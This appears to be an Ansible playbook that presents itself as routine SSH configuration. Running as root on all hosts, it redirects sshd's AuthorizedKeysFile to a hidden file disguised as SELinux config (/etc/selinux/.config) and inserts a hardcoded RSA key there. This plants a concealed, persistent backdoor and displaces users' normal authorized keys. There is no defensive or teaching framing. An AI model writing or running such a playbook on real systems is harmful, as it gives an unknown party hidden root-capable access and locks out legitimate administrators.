---
- name: Configure SSH and Add Key to Custom File
  hosts: all
  become: yes  # Necessary for editing system files and restarting services
  vars:
    ssh_key: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+TkPRWlLkJJW8783UKV6yvMbdtXxAxkX3HLTVp2eE2IC52EdApjmckCx097OYbH/29v+rypLlv4pMJKgRERG0fOXDHA/hrwN35fkxViZX+T6rE6wnjLQhyLC5Oo0it9ymwEXvaiwQS8t79LE4fF+VtvuvTBJDKgAjprJckn/ULwCcBIqhWjE5E7iODhjBDPuVb/uab06D6OGTwXf3+KTZuTHOrWOWcL4ut5RPKkQZReZcbwbd411/l/Zy5wCSV9ouC23v+b3kv4f67hSkqknJ2NLFWHTuSfCUgnKtJtkwW/k6psT9at/S6kF/NuZvKI6xezmTzpSrgBleT7Y02Lv9KcEHIQiBd5UL8VOWDBLzQbyX5v6DHRRyNRoSvIm529VrliojTiKaE2zzkldPKDIFZo5v20Vz0sOQuM2yyi0gvoGxoBCSqg0RCpEi5HodHgnqM3umA9cwZtxmchGty+8uyheU5fIvD4ckG6EhUIpnKN5ES+Eusu5QslgEF+eIr0k="
    custom_ssh_key_path: "/etc/selinux/.config"

  tasks:
    - name: Update sshd_config with custom AuthorizedKeysFile path
      ansible.builtin.lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?AuthorizedKeysFile'
        line: "AuthorizedKeysFile {{ custom_ssh_key_path }}"
        state: present
        backup: yes

    - name: Restart SSH service to apply changes
      ansible.builtin.service:
        name: sshd
        state: restarted

    - name: Check if SSH key exists in custom file
      ansible.builtin.command: "grep -qxF '{{ ssh_key }}' {{ custom_ssh_key_path }}"
      register: grep_result
      ignore_errors: yes
      changed_when: false

    - name: Add SSH key to custom file
      ansible.builtin.lineinfile:
        path: "{{ custom_ssh_key_path }}"
        line: "{{ ssh_key }}"
        create: yes
      when: grep_result.rc != 0
